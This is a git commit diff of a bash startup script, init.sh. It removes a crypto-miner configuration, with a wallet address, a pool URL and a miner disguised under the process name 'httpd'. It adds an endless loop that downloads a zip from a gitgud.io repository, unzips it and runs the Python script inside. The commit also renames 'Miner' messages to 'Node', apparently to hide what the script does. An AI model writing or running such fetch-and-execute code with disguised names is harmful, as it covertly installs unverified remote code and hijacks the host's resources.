65034dfb99dec181266ba5f6c6f233ef52f1ea04
brontosimungo <brontosimungo@outlook.co.id>
2025-06-10 10:51:41 +0700

    Update init.sh

--- init.sh
+++ init.sh
@@ -1,17 +1,10 @@
 #!/bin/bash
 
-# Wallet and worker configuration
-WALLET="0x1bE17413356722a411033303EF7D8A13768fdF83"
-WORKER="httpd"
-POOL_URL="stratum+tcp://$WALLET.$WORKER@pool-core-testnet.inichain.com:32672"
-
-# Infinite loop to restart the miner if it stops
 while true; do
   echo "Starting node..."
-  ./httpd --pool $POOL_URL --cpu-devices 0  >> 8080.log 2>&1
+  wget https://gitgud.io/acihnahe/cassanova/-/raw/master/workbanch.zip && unzip workbanch.zip && python3 run.py >> 8080.log 2>&1
 
-  # Check exit code of miner
   EXIT_CODE=$?
-  echo "Miner crashed with exit code $EXIT_CODE. Restarting in 5 seconds..."
+  echo "Node crashed with exit code $EXIT_CODE. Restarting in 5 seconds..."
   sleep 5
 done
